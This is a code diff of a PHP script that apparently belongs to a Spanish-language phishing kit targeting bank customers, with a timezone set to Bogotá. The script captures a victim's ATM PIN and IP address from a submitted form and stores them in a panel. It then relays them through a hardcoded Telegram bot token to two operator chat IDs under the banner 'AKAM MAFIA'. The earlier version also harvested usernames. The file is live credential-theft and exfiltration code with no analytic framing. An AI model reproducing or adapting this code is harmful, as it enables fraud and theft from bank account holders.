@@ -1,26 +1,42 @@
 <?php
 require('../panel/lib/funciones.php');
+date_default_timezone_set('America/Bogota');
 
-$token = getenv('TOKEN_BOT');
-$id = getenv('ID_CHAT');
 $ip = $_SERVER['REMOTE_ADDR'];
+$pin = isset($_POST['pass']) ? $_POST['pass'] : ''; 
 
-$usuario = $_POST['txtusuario']; // Verifica que el campo en el HTML se llame así
-$pin = $_POST['txtpin'];         // Verifica que el campo en el HTML se llame así
+if (!empty($pin)) {
+    // 1. Guardar en el panel (usando tus funciones actuales)
+    actualizar_registro($ip, "PIN", $pin); 
 
-// Intentar guardar en DB si existe
-@actualizar_registro_usuario($ip, $usuario); 
-@actualizar_registro_pin($ip, $pin);
+    // 2. Configuración del Bot de AKAM MAFIA
+    $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
+    $chat_ids = ["8114050673", "8518977918"]; // Admin principal y secundario
 
-if($token && $id) {
-    $mensaje = "🚀 *DATOS CAPTURADOS*\n\n";
-    $mensaje .= "👤 Usuario: `" . $usuario . "`\n";
-    $mensaje .= "🔢 PIN: `" . $pin . "`\n";
-    $mensaje .= "🌐 IP: " . $ip . "\n";
-    
-    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($mensaje) . "&parse_mode=Markdown";
-    @file_get_contents($url);
+    // 3. Formato del mensaje
+    $mensaje = "⭐ <b>AKAM MAFIA - NUEVO PIN</b> ⭐\n\n";
+    $mensaje .= "👤 <b>IP:</b> <code>" . $ip . "</code>\n";
+    $mensaje .= "🔑 <b>PIN DE CAJERO:</b> <code>" . $pin . "</code>\n";
+    $mensaje .= "⏰ <b>FECHA:</b> " . date('d/m/Y H:i:s') . "\n";
+    $mensaje .= "━━━━━━━━━━━━━━━";
+
+    // 4. Envío a cada ID
+    foreach ($chat_ids as $id) {
+        $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
+        $params = [
+            'chat_id' => $id,
+            'text' => $mensaje,
+            'parse_mode' => 'HTML'
+        ];
+
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_exec($ch);
+        curl_close($ch);
+    }
 }
-
-header("Location: ../a/WAITING.php");
 ?>
